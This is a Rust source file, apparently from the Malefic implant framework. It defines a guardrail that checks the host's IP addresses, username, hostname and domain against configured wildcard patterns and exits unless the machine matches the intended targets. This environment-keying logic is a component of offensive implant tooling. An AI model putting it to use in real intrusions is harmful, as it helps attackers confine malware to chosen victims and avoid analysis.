use malefic_helper::common::sysinfo::SysInfo;
use regex::Regex;

pub struct Guardrail;

impl Guardrail {
    pub fn check(sysinfo: SysInfo) {
        let config = &malefic_core::config::GUARDRAIL_CONFIG;

        if config.ip_addresses.is_empty()
            && config.usernames.is_empty()
            && config.server_names.is_empty()
            && config.domains.is_empty()
        {
            return;
        }

        let mut score = 0;
        
        fn check_patterns<'a, I>(patterns: &[String], values: I) -> bool
        where
            I: IntoIterator<Item = &'a str>,
        {
            if patterns.is_empty() {
                return true; 
            }
            values
                .into_iter()
                .any(|val| patterns.iter().any(|p| Guardrail::matches_pattern(val, p)))
        }

        // IP
        if check_patterns(&config.ip_addresses, sysinfo.ip_addresses.iter().map(|s| s.as_str())) {
            score += 1;
        }

        // 用户名
        if let Some(os) = &sysinfo.os {
            if check_patterns(&config.usernames, std::iter::once(os.username.as_str())) {
                score += 1;
            }
            if check_patterns(&config.server_names, std::iter::once(os.hostname.as_str())) {
                score += 1;
            }
        } else {
            if config.usernames.is_empty() {
                score += 1;
            }
            if config.server_names.is_empty() {
                score += 1;
            }
        }
        
        if check_patterns(&config.domains, std::iter::once(sysinfo.domain_name.as_str())) {
            score += 1;
        }
        
        let pass = (score == 4 && config.require_all) || (score > 0 && !config.require_all);
        if !pass {
            std::process::exit(1);
        }
    }

    fn matches_pattern(text: &str, pattern: &str) -> bool {
        match pattern {
            "" => text.is_empty(),
            "*" => true,
            _ if !pattern.contains('*') => text == pattern,
            _ => {
                let regex_pattern = regex::escape(pattern).replace("\\*", ".*");
                Regex::new(&regex_pattern)
                    .map(|re| re.is_match(text))
                    .unwrap_or(false)
            }
        }
    }
}
